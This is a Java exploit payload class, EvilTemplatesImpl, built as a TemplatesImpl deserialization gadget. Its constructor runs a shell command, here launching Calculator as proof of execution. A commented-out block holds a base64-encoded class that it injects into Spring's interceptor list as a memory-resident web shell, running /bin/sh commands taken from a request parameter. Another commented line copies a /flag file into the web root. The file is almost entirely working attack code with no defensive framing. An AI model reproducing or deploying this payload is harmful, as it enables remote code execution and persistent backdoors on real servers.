import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.ServletContext;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;

public class EvilTemplatesImpl extends AbstractTranslet {
//    static {
//        try {
//            ServletContext sss = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest().getSession().getServletContext();
//            org.springframework.web.context.WebApplicationContext context  = org.springframework.web.context.support.WebApplicationContextUtils.getWebApplicationContext(sss);
//            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
//            java.lang.reflect.Field field = null;
//            try {
//                field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
//            } catch (NoSuchFieldException e) {
//                e.printStackTrace();
//            }
//            field.setAccessible(true);
//            java.util.ArrayList<Object> adaptedInterceptors = null;
//            try {
//                adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
//            } catch (IllegalAccessException e) {
//                e.printStackTrace();
//            }
//            String className = "zzzz";
//            String b64 = "yv66vgAAADQAzgoAJwB9CwB+AH8IAIAKAIEAggcAgwgAhAgAhQgAhgsAhwCICgCBAIkHAIoKAIsAjAoACwCNBwCOCgAOAI8KAA4AkAcAkQoAEQB9CgARAJIIAJMKABEAlAoAlQCWBwCXCwAoAJgLACgAmQoABQCaCgCbAJwIAJ0HAJ4KAB0AfQoAnwCgCgAdAKEKAB0AogoABQCjCgCfAKQHAKUHAFsHAKYHAKcHAKgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABkx6enp6OwEACXByZUhhbmRsZQEAZChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7KVoBAARleGVjAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEAA2lzcgEAG0xqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyOwEAAmJyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAEbGluZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQADcmVzAQANU3RhY2tNYXBUYWJsZQcApgcAqQcAqgcApwcAqwcAgwcArAcAigcAjgcAlwEACkV4Y2VwdGlvbnMBAApwb3N0SGFuZGxlAQCSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7KVYBAAxtb2RlbEFuZFZpZXcBAC5Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7AQAPYWZ0ZXJDb21wbGV0aW9uAQB5KExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL0V4Y2VwdGlvbjspVgEAAmV4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAJdG9DU3RyaW5nAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAAXMBAAVieXRlcwEAAltCAQAGcmVzdWx0AQATaW5wdXRTdHJlYW1Ub1N0cmluZwEAOyhMamF2YS9pby9JbnB1dFN0cmVhbTtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADb3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAWEBAAFJAQABYgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAB2NoYXJzZXQHAJ4HAK0HAKUHAK4BAAtnZXRBcmdCbG9jawEAFyhbTGphdmEvbGFuZy9TdHJpbmc7KVtCAQABaQEAA2FyZwEACGNtZGFycmF5AQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABGFyZ3MBAANbW0IBAARzaXplAQAIYXJnQmxvY2sHAHQHAHIBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAClNvdXJjZUZpbGUBAAl6enp6LmphdmEMACkAKgcAqgwArwCwAQAABwCxDACyALMBABBqYXZhL2xhbmcvU3RyaW5nAQAHL2Jpbi9zaAEAAi1jAQAEeXlkcwcAqQwAtAC1DAAyALYBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwCsDAC3ALgMACkAuQEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIMACkAugwAuwC8AQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAL0AvgEAAQoMAL8AvAcAqwwAwADBAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwATwBQDABTAFQMAMIAwwcAxAwAxQDGAQAFVVRGLTgBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcArQwAxwDIDADJAMoMAMsAwwwAKQDMDADNACoBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAEenp6egEAEGphdmEvbGFuZy9PYmplY3QBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAE2phdmEvaW8vUHJpbnRXcml0ZXIBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2xhbmcvVGhyb3dhYmxlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAhnZXRCeXRlcwEABCgpW0IBABBqYXZhL2xhbmcvU3lzdGVtAQAJYXJyYXljb3B5AQAqKExqYXZhL2xhbmcvT2JqZWN0O0lMamF2YS9sYW5nL09iamVjdDtJSSlWAQAEcmVhZAEABShbQilJAQAFd3Jp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";
//
//            byte[] bytes = new byte[0];
//            try {
//                bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);
//            } catch (IOException e) {
//                e.printStackTrace();
//            } catch (InstantiationException e) {
//                e.printStackTrace();
//            } catch (IllegalAccessException e) {
//                e.printStackTrace();
//            }
//            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
//            try {
//                classLoader.loadClass(className);
//            }catch (ClassNotFoundException e){
//                java.lang.reflect.Method m0 = null;
//                try {
//                    m0 = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
//                } catch (NoSuchMethodException noSuchMethodException) {
//                    noSuchMethodException.printStackTrace();
//                }
//                m0.setAccessible(true);
//                try {
//                    m0.invoke(classLoader, className, bytes, 0, bytes.length);
//                } catch (IllegalAccessException illegalAccessException) {
//                    illegalAccessException.printStackTrace();
//                } catch (InvocationTargetException invocationTargetException) {
//                    invocationTargetException.printStackTrace();
//                }
//                try {
//                    adaptedInterceptors.add(classLoader.loadClass(className).newInstance());
//                } catch (InstantiationException instantiationException) {
//                    instantiationException.printStackTrace();
//                } catch (IllegalAccessException illegalAccessException) {
//                    illegalAccessException.printStackTrace();
//                } catch (ClassNotFoundException classNotFoundException) {
//                    classNotFoundException.printStackTrace();
//                }
//            }
//
//        }catch (Exception e){
//            e.printStackTrace();
//        }
//    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    public EvilTemplatesImpl() throws Exception {
        super();
//        Thread.sleep(50000);
        Runtime.getRuntime().exec("open -na Calculator");
//        Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","cat /flag > /usr/local/tomcat/webapps/ROOT/1.txt"});
    }
}